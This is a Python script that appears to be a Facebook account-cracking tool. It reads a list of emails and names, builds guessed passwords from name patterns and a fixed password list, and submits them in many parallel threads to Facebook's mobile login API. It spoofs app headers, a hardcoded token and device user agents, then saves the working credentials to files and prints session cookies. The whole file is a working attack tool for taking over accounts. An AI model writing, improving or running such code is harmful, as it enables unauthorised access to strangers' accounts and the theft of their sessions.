#!/usr/bin/python3
#TAMZID 01760104389
import os
import sys
import subprocess
import importlib
def ensure_module(module_name, package_name=None):
    package_name = package_name if package_name else module_name
    try:
        importlib.import_module(module_name)
    except ImportError:
        print(f"Module {module_name} not found. Installing {package_name}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])

# Ensure required modules are installed
ensure_module("rich")
ensure_module("requests")
ensure_module("bs4", "beautifulsoup4")

# Now, import the required modules
import os
import re
import time
import base64
import json
import uuid
import string
import random
import datetime
import hashlib

from rich.tree import Tree
from rich import print as Rprint
from rich.table import Table
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn
from rich.progress import SpinnerColumn
from rich.panel import Panel
from rich.text import Text
import requests
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool

oks = []
cps = []
loop = 0
id = []
id2 = []

RED = '\x1b[1;91m'
GREEN = '\x1b[1;92m'
YELLOW = '\x1b[1;93m'
BLUE = '\x1b[1;94m'
MAGENTA = '\x1b[1;95m'
CYAN = '\x1b[1;96m'
WHITE = '\x1b[1;97m'

def new(Ids, Names, Pwx, total):
    try:
        FirstName = Names.split(' ')[0]
        try:
                LastName = Names.split(' ')[1]
        except:
                LastName = 'khan'
        ps = FirstName.lower()
        ps2 = LastName.lower()
        for Pw in Pwx:
            pas = Pw.replace('First',FirstName).replace('Last',LastName).replace('first',ps).replace('last',ps2)
            print(Ids, pas)
            time.sleep(1)
    except:
        pass

def convertCookie(raw:dict) -> str:
    return('datr={};fr={};c_user={};xs={};'.format(raw['datr'],raw['fr'],raw['c_user'],raw['xs']))
    
def LoginEmail(email, Names, Pwx, total):
    global loop, oks, cps
    global message
    try:
        FirstName = Names.split(' ')[0]
        try:
                LastName = Names.split(' ')[1]
        except:
                LastName = 'khan'
        ps = FirstName.lower()
        ps2 = LastName.lower()
        for Pw in Pwx:
            password = Pw.replace('First',FirstName).replace('Last',LastName).replace('first',ps).replace('last',ps2)
            r = requests.Session()
            head = {'Host':'b-graph.facebook.com',
                'X-Fb-Connection-Quality':'EXCELLENT',
                'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'User-Agent':R_UA(),
                'X-Tigon-Is-Retry':'false',
                'X-Fb-Friendly-Name':'authenticate',
                'X-Fb-Connection-Bandwidth':str(random.randrange(70000000,80000000)),
                'Zero-Rated':'0',
                'X-Fb-Net-Hni':str(random.randrange(50000,60000)),
                'X-Fb-Sim-Hni':str(random.randrange(50000,60000)),
                'X-Fb-Request-Analytics-Tags':'{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
                'Content-Type':'application/x-www-form-urlencoded',
                'X-Fb-Connection-Type':'WIFI',
                'X-Fb-Device-Group':str(random.randrange(4700,5000)),
                'Priority':'u=3,i',
                'Accept-Encoding':'gzip, deflate',
                'X-Fb-Http-Engine':'Liger',
                'X-Fb-Client-Ip':'true',
                'X-Fb-Server-Cluster':'true',
                'Content-Length':str(random.randrange(1500,2000))}
            data = {'adid':str(uuid.uuid4()),
                'format':'json',
                'device_id':str(uuid.uuid4()),
                'email':email,
                'password':'#PWD_FB4A:0:{}:{}'.format(str(time.time())[:10], password),
                'generate_analytics_claim':'1',
                'community_id':'',
                'linked_guest_account_userid':'',
                'cpl':True,
                'try_num':'1',
                'family_device_id':str(uuid.uuid4()),
                'secure_family_device_id':str(uuid.uuid4()),
                'credentials_type':'password',
                'account_switcher_uids':[],
                'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3',
                'fb4a_shared_phone_cpl_group':'enable_v3_at_risk',
                'enroll_misauth':False,
                'generate_session_cookies':'1',
                'error_detail_type':'button_with_disabled',
                'source':'login',
                'machine_id':str(''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for i in range(24)])),
                'jazoest':str(random.randrange(22000,23000)),
                'meta_inf_fbmeta':'V2_UNTAGGED',
                'advertiser_id':str(uuid.uuid4()),
                'encrypted_msisdn':'',
                'currently_logged_in_userid':'0',
                'locale':'en_BD',
                'client_country_code':'BD',
                'fb_api_req_friendly_name':'authenticate',
                'fb_api_caller_class':'Fb4aAuthHandler',
                'api_key':'882a8490361da98702bf97a021ddc14d',
                'sig':str(hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:32]),
                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            pos  = r.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
            #print(pos)
            if ('session_key' in str(pos)) and ('access_token' in str(pos)):
                Rprint(f'[green]{email} | {password}[/green]')
                open('ok.txt', 'a').write(email+'|'+password+'\n')
                oks.append(email)
                #sys.exit()
                #token  = pos['access_token']
                cookie = convertCookie({i['name']:i['value'] for i in pos['session_cookies']})
                print(cookie)
                break
            elif ('www.facebook.com' in str(pos)):
                Rprint(f'[red]{email} | {password}[/red]')
                open('cp.txt', 'a').write(email+'|'+password+'\n')
                cps.append(email)
                #sys.exit()
                break
            else:
                try:
                    message = pos['error']['message']
                except: 
                    message = None
                continue
                #return({'status':'failed', 'id':None, 'name':None, 'gender':None, 'picture':None, 'friend':None, 'follower':None, 'post':None, 'cookie':None, 'token_eaab':None, 'token_eaag':None})
        sys.stdout.write(f'\r\r [T+S] %s/%s • OK:%s/CP:%s • %s '%(loop, total, len(oks), len(cps), message))
        sys.stdout.flush()
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        print(e)
        #return({'status':'failed', 'id':None, 'name':None, 'gender':None, 'picture':None, 'friend':None, 'follower':None, 'post':None, 'cookie':None, 'token_eaab':None, 'token_eaag':None})


user = []
def Random():
    os.system('clear')
    print("[🌺] EXAMPLE : [017 018 019 013 015 016] ")
    love = input('[🍁] SELECT : ')
    print('[🌺] EXAMPLE : [1000,5000,10000,15000,20000] ')
    limit = int(input('[🍁] LIMIT : '))
    for nmbr in range(limit):
        lova = ''.join(random.choice(string.digits) for _ in range(2))
        lovb = ''.join(random.choice(string.digits) for _ in range(2))
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=20) as Pool:
        os.system('clear')
        tl = str(len(user))
        print("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print('     [🌺] CHOICE CODE : '+love)
        print('     [🌺] TOTAL ID   :  '+tl)
        print('     [🌺] CRACK STARTED....... ')
        print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        for guru in user:
            uid = love+lova+lovb+guru
            pwx = [lova+lovb+guru,love+lova+lovb,love+love]
            Pool.submit(LoginEmail, uid, pwx, tl)
    print(50*'━')
    print(' [🍁] Crack Has Been Completed !')
    print(50*'━')
    exit()


def FileCrack():
    try:
        fileX = input('UID PATH: ')
        for line in open(fileX, 'r').readlines():
            id.append(line.strip())
        print('Total Found ID: %s'% (len(id)))
        IdSort()
    except IOError:
        print('File Not Found in: %s'%(fileX))

def IdSort():
    print('[1] Crack Old ID\n[2] Crack New ID\n[3] Crack Random ID')
    Choose = input('Input: ')
    if Choose in ['1','01']:
        for Old in sorted(id):
            id2.append(Old)
    elif Choose in ['2','02']:
        New = []
        for Newa in sorted(id):
            New.append(Newa)
        bcm = len(New)
        bcmi = (bcm-1)
        for Xnew in range(bcm):
            id2.append(New[bcmi])
            bcmi -= 1
    elif Choose in ['3','03']:
        for Random in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,Random)
    else:
        print('Wrong Choose !')
    PasswordManager()

def PasswordManager():
    PasswordList = []
    PasswordList.append('first last')
    PasswordList.append('First@1721')
    PasswordList.append('firstlast')
    PasswordList.append('first123')
    PasswordList.append('first12345')
    PasswordList.append('First Last')
    PasswordList.append('first123456')
    PasswordList.append('firstlast12345')
    PasswordList.append('firstlast123456')
    PasswordList.append('first last123') 
    PasswordList.append('lastfirst123')
    PasswordList.append('first2002')
    PasswordList.append('first2003')
    PasswordList.append ('first2004')
    PasswordList.append('first2005')
    PasswordList.append('first2006')
    PasswordList.append('first2007')
    PasswordList.append('first@123')
    PasswordList.append('last123')
    PasswordList.append('last123456')
    PasswordList.append('first123last')
    PasswordList.append('2000first')
    with ThreadPool(max_workers=30) as Pool:
        tl = str(len(id2))
        for id3 in id2:
            email,Names = id3.split('|')
            Pwx = PasswordList
            Pool.submit(LoginEmail, email, Names, Pwx, tl)
    print(50*'━')
    print(' [🍁] Crack Has Been Completed !')
    print(50*'━')
    exit()

def R_UA():
    samsung_models = [
        "SM-G920F|G920FXXU6EVH6",
        "SM-R870|R870XXU1AUH3",
        "SM-J320F|J320FXXU0ARL2",
        "SM-A125F|A125FXXU1BUA4",
        "GT-N7100|N7100XXSFQE1",
        "SM-T561|T561XXU0ARB1",
        "SM-A715F|A715FXXS5BUI1",
        "SM-J320F|I9500XXUEMJ3",
        "SM-M325F|M325FXXU1BUH1",
        "SM-J320F|J320FXXU0ARL2",
        "SM-F916U|F916USQS2JWE4",
    ]
    model_, build = random.choice(samsung_models).rsplit('|')
    os_v = random.randint(4, 13)
    fbav = f"{os_v}.0.{random.randint(111, 999)}.{random.randint(111, 999)}"
    ua = ('[FBAN/FB4A;FBAV/'+str(fbav)+';FBPN/com.facebook.katana;FBLC/bn_BD;FBBV/'+str(random.randint(111111111,999999999))+';[FBAN/FB4A;FBAV/117.74.47.93;FBBV/64878995;FBDM/{density=2.7,width=1223,height=2041};FBLC/en_US;FBRV/55276346;FBCR/null;FBMF/lge;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGE;FBSV/4.8;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FB4A/;FBAV/4Q095MQG;FBBV/490850717;FBAN/FB4A;FBAV/4Q095MQG;FBBV/490850717;FBDM//*{density=1.5,width=1920,height=1920};FBLC/fr_FR;FBRV/401313473;FBCR/Nokia;FBMF/VIVO;FBBD/Google;FBPN/com.facebook.katana;FBDV/Oppo_Reno_8;FBSV/12;FBOP/6;FBCA/armeabi;FBSS/;]')
    return ua


if __name__=='__main__':
    #print(R_UA())
    print(GREEN)
    FileCrack()